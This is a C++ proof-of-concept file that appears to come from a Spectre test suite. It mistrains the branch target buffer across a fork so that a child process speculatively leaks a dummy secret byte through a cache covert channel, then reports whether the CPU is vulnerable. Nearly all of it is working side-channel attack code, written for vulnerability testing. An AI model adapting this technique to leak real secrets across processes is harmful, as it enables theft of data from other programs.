#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sched.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

extern "C"
{
#include "libcache/cache.h"
#include "lib/global.h"
}

#define SECRET 'S'

// Base class
class Animal
{
public:
    virtual void move()
    {
    }
};

// Bird contains the secret
class Bird : public Animal
{
private:
    char secret;

public:
    Bird()
    {
        secret = SECRET;
    }
    void move()
    {
        // nop
    }
};

// Class that contains the function to leak data
class Fish : public Animal
{
private:
    char data;

public:
    Fish()
    {
        data = 'F';
    }
    void move()
    {
        //Encode data in the cache
        cache_encode(data);
    }
};

// Function so that we always call animal->move from the same virtual address
// required for indexing always the same BTB entry
void move_animal(Animal *animal)
{
    animal->move();
}

int main(int argc, char **argv)
{
    PREPARE();
    printf("Spectre_BTB_ca_ip Begins...\n");
    // Cross-address-space attack, so we fork
    int is_child = (fork() == 0);
    Fish *fish = new Fish();
    Bird *bird = new Bird(); // contains secret

    char *ptr = (char *)((((size_t)move_animal)) & ~(pagesize - 1));
    mprotect(ptr, pagesize * 2, PROT_WRITE | PROT_READ | PROT_EXEC);
    maccess((void *)move_animal);

    // trigger COW for the page containing the function
    ptr[0] = ptr[0];

    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // Parent is doing the mistraining
        if (!is_child)
        {
            nospec();
            // train for fish
            for (int j = 0; j < 10000; j++)
            {
                move_animal(fish);
            }
        }
        // Flush our shared memory
        flush_shared_memory();
        mfence();

        // Increase misspeculation chance
        flush(bird);
        mfence();

        // Child is leaking data
        if (is_child)
        {
            nospec();
            // Leak bird secret
            move_animal(bird);

            // Recover data from the covert channel
            if (cache_decode() == 'S')
            {
                passed_count++;
            }
        }
    }
    if (is_child)
    {

        if ((double)passed_count / MAX_TRY_TIMES > 0.3)
        {
            printf(ANSI_COLOR_RED "Spectre_BTB_ca_ip: Vulnerable\n" ANSI_COLOR_RESET);
        }
        else
        {
            printf(ANSI_COLOR_GREEN "Spectre_BTB_ca_ip: Not Vulnerable\n" ANSI_COLOR_RESET);
        }
        printf("Spectre_BTB_ca_ip Done!\n\n");
        exit(-1);
    }
}
